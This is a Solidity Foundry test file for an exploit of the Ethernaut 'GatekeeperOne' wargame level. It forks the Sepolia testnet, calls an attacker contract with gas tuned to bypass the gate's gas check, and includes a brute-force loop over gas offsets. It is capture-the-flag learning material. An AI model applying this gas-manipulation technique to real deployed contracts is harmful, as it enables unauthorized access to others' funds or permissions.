// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";
import {AttackGatekeeperOne} from "../src/AttackGatekeeperOne.sol";

contract AttackGatekeeperOneTest is Test {
    GatekeeperOne public gatekeeperOne;
    AttackGatekeeperOne public attackGatekeeperOne;

    // Create test addresses
    address ownerAttacker = makeAddr("ownerAttacker");

    string SEPOLIA_RPC_URL = vm.envString("SEPOLIA_RPC_URL");
    address gatekeeperOneAddress = vm.envAddress("SEPOLIA_GATEKEEPER_ONE_CONTRACT");

    function setUp() public {
        vm.createSelectFork(SEPOLIA_RPC_URL);
        gatekeeperOne = GatekeeperOne(gatekeeperOneAddress);
        vm.prank(ownerAttacker);
        attackGatekeeperOne = new AttackGatekeeperOne();
    }

    function test_attack() public {
        assertNotEq(gatekeeperOne.entrant(), tx.origin);

        uint256 _gas = 24829; // 8191 required by the gate * 3 to prevent OutOfGas +
            // 256 gas spent before the GAS opcode (bytecode dependent, therefore should be fork tested)
        vm.prank(ownerAttacker);
        attackGatekeeperOne.attack(address(gatekeeperOne), _gas);

        assertEq(gatekeeperOne.entrant(), tx.origin);
    }

    function test_attack_brute_force() public {
        assertNotEq(gatekeeperOne.entrant(), tx.origin);

        uint256 _gas = 8191 * 3; // 8191 required by the gate * 3 to prevent OutOfGas
        for (uint256 i = 240; i < 320; i++) {
            vm.prank(ownerAttacker);
            attackGatekeeperOne.attack(address(gatekeeperOne), _gas + i);
            if (gatekeeperOne.entrant() == tx.origin) {
                console.log("Additional gas need on top of base value (%s) = %s", _gas, i);
                break;
            }
        }

        assertEq(gatekeeperOne.entrant(), tx.origin);
    }
}
